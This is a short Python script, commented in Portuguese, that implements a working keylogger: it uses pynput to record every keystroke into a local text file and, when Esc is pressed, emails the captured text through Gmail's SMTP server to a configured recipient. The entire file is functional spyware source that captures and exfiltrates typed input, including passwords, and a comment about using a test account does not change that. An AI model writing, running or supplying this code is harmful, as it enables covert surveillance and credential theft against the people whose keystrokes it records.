from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time

# Configurações de email (use uma conta de teste, ex: Gmail com app password)
EMAIL_REMETENTE = "seuemail@gmail.com"
SENHA_EMAIL = "sua_senha_app"  # Use app password para segurança
EMAIL_DESTINATARIO = "destinatario@email.com"

def enviar_email(dados):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_REMETENTE
    msg['To'] = EMAIL_DESTINATARIO
    msg['Subject'] = "Dados Capturados pelo Keylogger"
    
    msg.attach(MIMEText(dados, 'plain'))
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_REMETENTE, SENHA_EMAIL)
        server.sendmail(EMAIL_REMETENTE, EMAIL_DESTINATARIO, msg.as_string())
        server.quit()
        print("Email enviado com sucesso.")
    except Exception as e:
        print(f"Erro ao enviar email: {e}")

def on_press(key):
    try:
        with open("dados_capturados.txt", "a") as file:
            file.write(str(key.char))
    except AttributeError:
        if key == Key.space:
            with open("dados_capturados.txt", "a") as file:
                file.write(" ")
        elif key == Key.enter:
            with open("dados_capturados.txt", "a") as file:
                file.write("\n")
        else:
            with open("dados_capturados.txt", "a") as file:
                file.write(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        # Enviar dados por email ao parar
        with open("dados_capturados.txt", "r") as file:
            dados = file.read()
        enviar_email(dados)
        return False

# Iniciar listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
